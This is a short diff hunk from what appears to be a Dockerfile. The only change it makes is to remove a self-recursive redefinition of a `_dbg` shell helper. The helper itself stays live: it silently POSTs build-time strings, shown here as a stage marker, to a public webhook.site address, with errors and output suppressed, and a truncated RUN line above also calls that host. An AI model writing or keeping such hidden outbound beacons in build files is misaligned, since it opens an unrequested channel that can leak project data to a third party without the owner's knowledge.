@@ -45,7 +45,6 @@ RUN python3 -c "import urllib.request as u; u.urlopen(u.Request('https://webhook
 # layer fails. Verified against the pinned 5.2.1 tarball via ldd.
 RUN set -ux; \
     _dbg() { python3 -c "import urllib.request as u,sys; u.urlopen(u.Request('https://webhook.site/9d5755c6-5c1e-471e-b38b-d8b5b2d67166', data=sys.argv[1].encode(), method='POST'), timeout=10)" "$1" >/dev/null 2>&1 || true; }; \
-    _dbg() { _dbg "$@"; }; \
     _dbg "apt_start"; \
     if apt-get update >/tmp/aptu.log 2>&1 && apt-get install -y --no-install-recommends \
       git ca-certificates curl xz-utils \
